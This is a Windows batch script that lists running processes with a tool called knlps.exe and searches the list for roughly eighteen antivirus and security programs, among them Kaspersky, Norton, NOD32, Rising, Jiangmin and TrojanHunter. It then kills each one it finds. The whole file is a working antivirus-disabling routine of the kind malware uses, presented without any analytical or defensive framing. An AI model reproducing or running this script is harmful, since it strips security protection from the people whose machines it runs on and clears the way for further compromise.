@echo off

knlps.exe -l >PID.txt

findstr /i "RavMon.exe" PID.txt >>rav.txt
findstr /i "RavMonD.exe" PID.txt >>rav.txt
findstr /i "CCenter.exe" PID.txt >>rav.txt
findstr /i "avp.exe" PID.txt >>rav.txt
findstr /i "KVMonXP.kxp" PID.txt >>rav.txt
findstr /i "KVxp.kxp" PID.txt >>rav.txt
findstr /i "kvsrvxp.exe" PID.txt >>rav.txt
findstr /i "kvwsc.exe" PID.txt >>rav.txt
findstr /i "KAVStart.exe" PID.txt >>rav.txt
findstr /i "KWatch.exe" PID.txt >>rav.txt
findstr /i "Navapw32.exe" PID.txt >>rav.txt
findstr /i "Navapsvc.exe" PID.txt >>rav.txt
findstr /i "KAVsvc.exe" PID.txt >>rav.txt
findstr /i "KAVsvcUI.exe" PID.txt >>rav.txt
findstr /i "Iparmor.exe" PID.txt >>rav.txt
findstr /i "TrojanHunter.exe" PID.txt >>rav.txt
findstr /i "THGUARD.EXE" PID.txt >>rav.txt
findstr /i "nod32krn.exe" PID.txt >>rav.txt

for /f "eol=; tokens=1 delims= " %%1 in (rav.txt) do knlps.exe -k %%1
